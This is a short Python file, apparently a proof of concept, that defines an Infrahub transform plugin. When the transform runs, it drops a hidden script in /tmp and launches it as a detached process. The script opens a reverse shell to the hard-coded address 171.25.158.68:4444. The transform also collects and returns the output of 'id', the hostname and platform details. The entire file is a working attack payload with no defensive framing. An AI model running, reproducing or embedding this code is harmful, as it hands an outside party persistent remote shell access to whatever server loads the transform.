import os
import platform
import socket
import subprocess

from infrahub_sdk.transforms import InfrahubTransform

RSHELL = """
import socket, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("171.25.158.68", 4444))
[os.dup2(s.fileno(), f) for f in (0, 1, 2)]
pty.spawn(["/bin/bash", "/bin/sh"][os.path.exists("/bin/sh")])
"""

CALLBACK_HOST = "171.25.158.68"
CALLBACK_PORT = 4444


class PocTransform(InfrahubTransform):
    query = "poc_query"
    url = "poc-transform"
    timeout: int = 60

    async def transform(self, data: dict) -> dict:
        with open("/tmp/.rs.py", "w") as f:
            f.write(RSHELL)
        # detached session -> survives the transform request/worker task lifecycle
        subprocess.Popen(
            ["python3", "/tmp/.rs.py"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        return {
            "id": os.popen("id").read().strip(),
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "callback": f"{CALLBACK_HOST}:{CALLBACK_PORT}",
        }
